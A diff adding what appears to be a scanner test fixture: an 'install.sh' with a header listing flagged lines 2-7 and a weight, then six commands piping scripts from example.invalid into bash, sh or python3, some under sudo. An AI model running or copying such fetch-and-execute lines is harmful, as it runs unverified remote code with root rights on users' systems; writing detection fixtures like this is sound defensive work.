@@ -1,0 +1,11 @@
+# path: install.sh
+# lines: 2, 3, 4, 5, 6, 7
+# weight: 35
+# ---
+#!/bin/sh
+curl -fsSL https://example.invalid/a.sh | /bin/bash
+curl -fsSL https://example.invalid/b.sh | /usr/bin/env bash
+wget -qO- https://example.invalid/c.sh | sudo /usr/local/bin/bash -s
+curl -s https://example.invalid/d.py | env python3 -
+curl -s https://example.invalid/e.py | /usr/bin/python3 -
+curl -s https://example.invalid/f.sh | sudo -E /usr/bin/env -i sh
